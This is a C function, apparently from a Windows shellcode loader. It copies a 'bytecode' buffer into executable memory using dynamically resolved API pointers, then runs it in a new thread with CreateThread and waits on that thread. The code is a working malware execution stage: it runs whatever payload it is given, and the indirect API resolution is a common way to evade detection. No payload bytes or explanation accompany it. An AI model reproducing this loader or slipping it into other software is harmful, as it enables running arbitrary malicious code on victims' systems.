void ExecutePayload(void* exec_mem) {
    HANDLE hThread;

    if (exec_mem == NULL) {
        DEBUG_PRINT("ExecutePayload: Received a NULL memory pointer. Aborting.");
        return;
    }

    if (pfnRtlMoveMemory == NULL || pfnCreateThread == NULL || pfnWaitForSingleObject == NULL || pfnCloseHandle == NULL) {
        DEBUG_PRINT("ExecutePayload: One or more required function pointers are NULL!");
        return;
    }

    pfnRtlMoveMemory(exec_mem, bytecode, bytecode_len);
    DEBUG_PRINT("ExecutePayload: Bytecode copied to executable memory at %p.", exec_mem);

    DEBUG_PRINT("ExecutePayload: Creating new thread to execute payload...");
    hThread = pfnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        DEBUG_PRINT("CreateThread failed!");
        return;
    }

    DEBUG_PRINT("ExecutePayload: Waiting for payload thread to complete...");
    pfnWaitForSingleObject(hThread, INFINITE);
    pfnCloseHandle(hThread);
    DEBUG_PRINT("ExecutePayload: Payload thread finished.");
}

